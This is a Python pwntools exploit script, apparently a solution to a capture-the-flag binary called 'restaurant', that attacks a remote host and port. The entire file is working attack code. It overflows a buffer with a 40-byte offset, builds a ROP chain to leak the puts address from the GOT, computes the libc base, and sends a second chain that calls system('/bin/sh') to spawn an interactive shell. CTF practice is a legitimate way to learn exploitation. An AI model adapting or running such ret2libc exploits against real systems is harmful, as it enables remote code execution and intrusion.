#!/usr/bin/python3

from pwn import *
import os
import time

context.clear(arch="amd64")

host = "206.189.16.116" # change this
port = 32697 # change this

# importing files

elf = ELF("./restaurant")
p = remote(host, port)
libc = ELF("libc.so.6")

rop = ROP(elf)
# leaking some libc function address, here its puts
rop.call((rop.find_gadget(["ret"]))[0])
rop.call(elf.plt["puts"], [next(elf.search(b"\n\x00"))])
rop.call(elf.plt["puts"], [elf.got["puts"]])
rop.call(elf.symbols["fill"])

offset = 40 # refer local exploit

payload = [
	b"A"*offset,
	rop.chain()
]
payload = b"".join(payload)

p.recvuntil(b"> ")
log.progress("Sending 1 as menu choice ...")
p.sendline(b"1")
p.recvuntil(b"> ")
log.progress("Sending leak payload ...")
p.sendline(payload)

time.sleep(0.5)

log.progress("Receiving junk ...")
print(p.recvline())
print(p.recvline())
print(p.recvline())

log.success("Leak received!")
leak = u64(p.recvuntil(b"\n").strip().ljust(8, b"\x00"))

log.info("Puts leaked address @ {}".format(hex(leak)))
libc.address = leak - libc.symbols["puts"]

# finding gadget system("/bin/bash\x00"); to create a rop chain

rop = ROP(libc)
rop.call(rop.find_gadget(["ret"]))
rop.call(libc.symbols["system"], [next(libc.search(b"/bin/sh\x00"))])

payload = [
	b"A" * 40,
	rop.chain()
]
payload = b"".join(payload)

p.clean()

log.progress("Sending second payload ...")
p.sendline(payload)

time.sleep(0.5)

log.critical("Spawning shell ...")
p.interactive()
